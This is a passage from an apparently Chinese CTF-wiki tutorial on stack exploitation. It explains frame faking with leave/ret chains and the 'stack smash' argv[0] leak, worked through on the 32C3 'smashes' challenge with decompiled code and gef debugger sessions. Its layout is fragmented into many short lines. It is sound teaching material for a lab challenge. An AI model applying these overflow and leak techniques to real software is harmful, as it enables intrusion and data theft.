ret\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684leave ret\u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21leave ret\u3002\n\n\n\u5176\u4e2dfake ebp\u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b\n\n\n\n\nfake ebp\n|\nv\nebp2|target function addr|leave ret addr|arg1|arg2\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u7684fake ebp\u6307\u5411ebp2\uff0c\u5373\u5b83\u4e3aebp2\u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002\n\n\n\u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT\nT \u8bed\u6cd5\u3002\n\n\n\u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c\n\n\n\u5165\u53e3\u70b9\n\n\npush ebp  # \u5c06ebp\u538b\u6808\nmove esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp\n\n\n\n\n\u51fa\u53e3\u70b9\n\n\nleave\nret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740\n\n\n\n\n\u5176\u4e2dleave\u6307\u4ee4\u76f8\u5f53\u4e8e\n\n\nmove ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp\npop ebp #\u5f39\u51faebp\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002\n\n\n\n\n\n\n\u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884cleave\u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\n\n\n\n\n\n\nmove ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684ebp\u57fa\u5730\u5740\u5904\u3002\n\n\n\n\n\n\npop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684fake ebp\u7684\u503c\u8d4b\u7ed9ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86ebp2\u6240\u5728\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\u6267\u884cret\u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884cleave ret\u6307\u4ee4\u3002\n\n\n\n\n\n\n\u6267\u884cleave\u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\n\n\n\n\n\n\nmove ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u6307\u5411ebp2\u3002\n\n\n\n\n\n\npop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06ebp\u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3aebp2\u7684\u503c\uff0c\u540c\u65f6esp\u4f1a\u6307\u5411target function\u3002\n\n\n\n\n\n\n\u6267\u884cret\u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884ctargetfunction\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c\n\n\n\n\n\n\npush ebp,\u4f1a\u5c06ebp2\u503c\u538b\u5165\u6808\u4e2d\uff0c\n\n\n\n\n\n\nmove esp, ebp\uff0c\u5c06ebp\u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002\n\n\n\n\n\n\n\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b\n\n\nebp\n|\nv\nebp2|leave ret addr|arg1|arg2\n\n\n\n\n\n\n\n\n\u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002\n\n\n\n\n\n\n\u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728ebp2\u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u5728fake frame\u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0estack privot\u76f8\u4f3c\u3002\n\n\n\u4f8b\u5b50\n\n\n\u76ee\u524d\u6765\u8bf4\uff0c\u6211\u5728exploit-exercise\u7684fusion level2\u4e2d\u5229\u7528\u8fc7\u8fd9\u4e2a\u6280\u5de7\uff0c\u5176\u5b83\u5730\u65b9\u6682\u65f6\u8fd8\u672a\u9047\u5230\uff0c\u9047\u5230\u7684\u65f6\u5019\u518d\u8fdb\u884c\u8865\u5145\u3002\n\n\n\u9898\u76ee\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://www.xfocus.net/articles/200602/851.html\n\n\nhttp://phrack.org/issues/58/4.html\n\n\n\n\nStack smash\n\n\n\u539f\u7406\n\n\n\u5728\u7a0b\u5e8f\u52a0\u4e86canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684buffer\u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800cstack smash\u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u53d1\u73b0canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0canary\u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c__stack_chk_fail\u51fd\u6570\u6765\u6253\u5370argv[0]\u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b\n\n\nvoid\n \n__attribute__\n \n((\nnoreturn\n))\n \n__stack_chk_fail\n \n(\nvoid\n)\n\n\n{\n\n  \n__fortify_fail\n \n(\nstack smashing detected\n);\n\n\n}\n\n\nvoid\n \n__attribute__\n \n((\nnoreturn\n))\n \ninternal_function\n \n__fortify_fail\n \n(\nconst\n \nchar\n \n*\nmsg\n)\n\n\n{\n\n  \n/* The loop is added only to keep gcc happy.  */\n\n  \nwhile\n \n(\n1\n)\n\n    \n__libc_message\n \n(\n2\n,\n \n*** %s ***: %s terminated\n\\n\n,\n\n                    \nmsg\n,\n \n__libc_argv\n[\n0\n]\n \n?:\n \nunknown\n);\n\n\n}\n\n\n\n\n\n\u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728__fortify_fail\u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52015\u5e7432C3 CTF smashes\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728jarvisoj\u4e0a\u6709\u590d\u73b0\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86Canary\u4fdd\u62a4\u4ee5\u53caNX\u4fdd\u62a4\uff0c\u4ee5\u53caFORTIFY\u4fdd\u62a4\u3002\n\n\n\u279c  stacksmashes git:\n(\nmaster\n)\n \u2717 checksec smashes\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\nida\u770b\u4e00\u4e0b\n\n\n__int64\n \nsub_4007E0\n()\n\n\n{\n\n  \n__int64\n \nv0\n;\n \n// rax@1\n\n  \n__int64\n \nv1\n;\n \n// rbx@2\n\n  \nint\n \nv2\n;\n \n// eax@3\n\n  \n__int64\n \nv4\n;\n \n// [sp+0h] [bp-128h]@1\n\n  \n__int64\n \nv5\n;\n \n// [sp+108h] [bp-20h]@1\n\n\n  \nv5\n \n=\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n);\n\n  \n__printf_chk\n(\n1LL\n,\n \n(\n__int64\n)\nHello!\n\\n\nWhat\ns your name? \n);\n\n  \nLODWORD\n(\nv0\n)\n \n=\n \n_IO_gets\n((\n__int64\n)\nv4\n);\n\n  \nif\n \n(\n \n!\nv0\n \n)\n\n\nLABEL_9\n:\n\n    \n_exit\n(\n1\n);\n\n  \nv1\n \n=\n \n0LL\n;\n\n  \n__printf_chk\n(\n1LL\n,\n \n(\n__int64\n)\nNice to meet you, %s.\n\\n\nPlease overwrite the flag: \n);\n\n  \nwhile\n \n(\n \n1\n \n)\n\n  \n{\n\n    \nv2\n \n=\n \n_IO_getc\n(\nstdin\n);\n\n    \nif\n \n(\n \nv2\n \n==\n \n-\n1\n \n)\n\n      \ngoto\n \nLABEL_9\n;\n\n    \nif\n \n(\n \nv2\n \n==\n \n\\n\n \n)\n\n      \nbreak\n;\n\n    \nbyte_600D20\n[\nv1\n++\n]\n \n=\n \nv2\n;\n\n    \nif\n \n(\n \nv1\n \n==\n \n \n \n)\n\n      \ngoto\n \nLABEL_8\n;\n\n  \n}\n\n  \nmemset\n((\nvoid\n \n*\n)((\nsigned\n \nint\n)\nv1\n \n+\n \n0x600D20LL\n),\n \n0\n,\n \n(\nunsigned\n \nint\n)(\n32\n \n-\n \nv1\n));\n\n\nLABEL_8\n:\n\n  \nputs\n(\nThank you, bye!\n);\n\n  \nreturn\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\n\u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728_IO_gets((__int64)\nv4);\u5b58\u5728\u6808\u6ea2\u51fa\u3002\n\n\n\u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728while\u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5\n\n\n  \nmemset\n((\nvoid\n \n*\n)((\nsigned\n \nint\n)\nv1\n \n+\n \n0x600D20LL\n),\n \n0\n,\n \n(\nunsigned\n \nint\n)(\n32\n \n-\n \nv1\n));\n\n\n\n\n\n\u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002\n\n\n.data:0000000000600D20 ; char aPctfHereSTheFl[]\n.data:0000000000600D20 aPctfHereSTheFl db \nPCTF{Here\n,27h,\ns the flag on server}\n,0\n\n\n\n\n\u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9\nbyte_600D20[v1++] = v2;\n\u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86\n\n\n\n\n\u5728EFL\u5185\u5b58\u6620\u5c04\u65f6\uff0cbss\u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528gdb\u7684find\u6765\u8fdb\u884c\u67e5\u627e\u3002\n\n\n\n\n\u786e\u5b9aflag\u5730\u5740\n\n\n\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7dmemset\u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\nHello\n!\n\n\nWhat\ns\n \nyour\n \nname\n?\n \nqqqqqqq\n\n\nNice\n \nto\n \nmeet\n \nyou\n,\n \nqqqqqqq.\n\n\nPlease\n \noverwrite\n \nthe\n \nflag\n:\n \n222222222\n\n\n\nBreakpoint\n \n1\n,\n \n__memset_avx2\n \n()\n \nat\n \n..\n/\nsysdeps\n/\nx86_64\n/\nmultiarch\n/\nmemset-avx2.S\n:\n38\n\n\n38\n  \n..\n/\nsysdeps\n/\nx86_64\n/\nmultiarch\n/\nmemset-avx2.S\n:\n \n\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\n.\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n   \n0\nx7ffff7b7f920\n \n__memset_chk_avx2\n+\n0\n \ncmp\n    \nrcx\n,\n \nrdx\n\n   \n0\nx7ffff7b7f923\n \n__memset_chk_avx2\n+\n3\n \njb\n     \n0x7ffff7b24110\n \n__GI___chk_fail\n\n   \n0\nx7ffff7b7f929\n                  \nnop\n    \nDWORD\n \nPTR\n \n[\nrax\n+\n0x0\n]\n\n \n\u2192\n \n0\nx7ffff7b7f930\n \n__memset_avx2\n+\n0\n \nvpxor\n  \nxmm0\n,\n \nxmm0\n,\n \nxmm0\n\n   \n0\nx7ffff7b7f934\n \n__memset_avx2\n+\n4\n \nvmovd\n  \nxmm1\n,\n \nesi\n\n   \n0\nx7ffff7b7f938\n \n__memset_avx2\n+\n8\n \nlea\n    \nrsi\n,\n \n[\nrdi\n+\nrdx\n*\n1\n]\n\n   \n0\nx7ffff7b7f93c\n \n__memset_avx2\n+\n12\n \nmov\n    \nrax\n,\n \nrdi\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffda38\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffda38\n\u2502+\n0x00\n:\n \n0x0000000000400878\n  \n\u2192\n   \nmov\n \nedi\n,\n \n0x40094e\n  \n\u2190\n \n$rsp\n\n\n0\nx00007fffffffda40\n\u2502+\n0x08\n:\n \n0x0071717171717171\n \n(\nqqqqqqq\n?\n)\n\n\n0\nx00007fffffffda48\n\u2502+\n0x10\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda50\n\u2502+\n0x18\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda58\n\u2502+\n0x20\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda60\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda68\n\u2502+\n0x30\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda70\n\u2502+\n0x38\n:\n \n0x0000000000000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2()\n\n\n[\n#1] 0x400878 \u2192 mov edi, 0x40094e\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nfind\n \n22222\n\n\nArgument\n \nrequired\n \n(\nexpression\n \nto\n \ncompute\n).\n\n\ngef\n\u27a4\n  \nfind\n \n22222\n\n\nNo\n \nsymbol\n \n22222\n \nin\n \ncurrent\n \ncontext.\n\n\ngef\n\u27a4\n  \ngrep\n \n22222\n\n\n[+]\n \nSearching\n \n22222\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n(\n0x600000\n-\n0x601000\n),\n \npermission\n=\nrw-\n\n  \n0\nx600d20\n \n-\n \n0x600d3f\n  \n\u2192\n   \n222222222\ns\n \nthe\n \nflag\n \non\n \nserver\n}\n \n\n[\n+\n]\n \nIn\n \n[\nheap\n]\n(\n0x601000\n-\n0x622000\n),\n \npermission\n=\nrw-\n\n  \n0\nx601010\n \n-\n \n0x601019\n  \n\u2192\n   \n222222222\n \n\ngef\n\u27a4\n  \ngrep\n \nPCTF\n\n\n[+]\n \nSearching\n \nPCTF\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n(\n0x400000\n-\n0x401000\n),\n \npermission\n=\nr-x\n\n  \n0\nx400d20\n \n-\n \n0x400d3f\n  \n\u2192\n   \nPCTF\n{\nHere\ns\n \nthe\n \nflag\n \non\n \nserver\n}\n \n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u76842222\u5df2\u7ecf\u8986\u76d6\u4e860x600d20\u5904\u7684flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u76840x400d20\u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86flag\u7684\u5730\u5740\u3002\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9aargv[0]\u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002\n\n\n\u9996\u5148\u4e0b\u65ad\u70b9\u5728main\u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nb\n \n*\n0x00000000004006D0\n\n\nBreakpoint\n \n1\n \nat\n \n0x4006d0\n\n\ngef\n\u27a4\n  \nr\n\n\nStarting\n \nprogram\n:\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n \n\n\nBreakpoint\n \n1\n,\n \n0x00000000004006d0\n \nin\n \n??\n \n()\n\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n     \n0\nx4006c0\n \n_IO_gets@plt\n+\n0\n \njmp\n    \nQWORD\n \nPTR\n \n[\nrip\n+\n0x20062a\n]\n        \n# 0x600cf0 \n_IO_gets@got.plt\n\n     \n0x4006c6\n \n_IO_gets@plt\n+\n6\n \npush\n   \n0x9\n\n     \n0\nx4006cb\n \n_IO_gets@plt\n+\n11\n \njmp\n    \n0x400620\n\n \n\u2192\n   \n0\nx4006d0\n                  \nsub\n    \nrsp\n,\n \n0x8\n\n     \n0\nx4006d4\n                  \nmov\n    \nrdi\n,\n \nQWORD\n \nPTR\n \n[\nrip\n+\n0x200665\n]\n        \n# 0x600d40 \nstdout\n\n     \n0x4006db\n                  \nxor\n    \nesi\n,\n \nesi\n\n     \n0\nx4006dd\n                  \ncall\n   \n0x400660\n \nsetbuf@plt\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffdb78\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffdb78\n\u2502+\n0x00\n:\n \n0x00007ffff7a2d830\n  \n\u2192\n  \n__libc_start_main\n+\n240\n \nmov\n \nedi\n,\n \neax\n    \n\u2190\n \n$rsp\n\n\n0\nx00007fffffffdb80\n\u2502+\n0x08\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffdb88\n\u2502+\n0x10\n:\n \n0x00007fffffffdc58\n  \n\u2192\n  \n0x00007fffffffe00b\n  \n\u2192\n  \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexam\n[...]\n\n\n0\nx00007fffffffdb90\n\u2502+\n0x18\n:\n \n0x0000000100000000\n\n\n0\nx00007fffffffdb98\n\u2502+\n0x20\n:\n \n0x00000000004006d0\n  \n\u2192\n   \nsub\n \nrsp\n,\n \n0x8\n\n\n0\nx00007fffffffdba0\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffdba8\n\u2502+\n0x30\n:\n \n0x48c916d3cf726fe3\n\n\n0\nx00007fffffffdbb0\n\u2502+\n0x38\n:\n \n0x00000000004006ee\n  \n\u2192\n   \nxor\n \nebp\n,\n \nebp\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x4006d0 \u2192 sub rsp, 0x8\n\n\n[\n#1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=\noptimized out\n, fini=\noptimized out\n, rtld_fini=\noptimized out\n, stack_end=0x7fffffffdc48)\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#2] 0x400717 \u2192 hlt \n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa0x00007fffffffe00b\u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662fargv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58\u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f0x00007fffffffdc58\u3002\n\n\n\u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801\n\n\n.text:\n00000000004007\nE0\n                 \npush\n    \nrbp\n\n\n.text:\n00000000004007\nE1\n                 \nmov\n     \nesi\n,\n \noffset\n \naHelloWhatSYour\n \n; \nHello!\\nWhat\ns your name? \n\n\n.text\n:\n00000000004007\nE6\n                 \nmov\n     \nedi\n,\n \n1\n\n\n.text:\n00000000004007\nEB\n                 \npush\n    \nrbx\n\n\n.text:\n00000000004007\nEC\n                 \nsub\n     \nrsp\n,\n \n118\nh\n\n\n.text:\n00000000004007\nF3\n                 \nmov\n     \nrax\n,\n \nfs\n:\n28\nh\n\n\n.text:\n00000000004007\nFC\n                 \nmov\n     \n[\nrsp\n+\n128\nh\n+\nvar_20\n],\n \nrax\n\n\n.text:\n0000000000400804\n                 \nxor\n     \neax\n,\n \neax\n\n\n.text:\n0000000000400806\n                 \ncall\n    \n___printf_chk\n\n\n.text:\n000000000040080\nB\n                 \nmov\n     \nrdi\n,\n \nrsp\n\n\n.text:\n000000000040080\nE\n                 \ncall\n    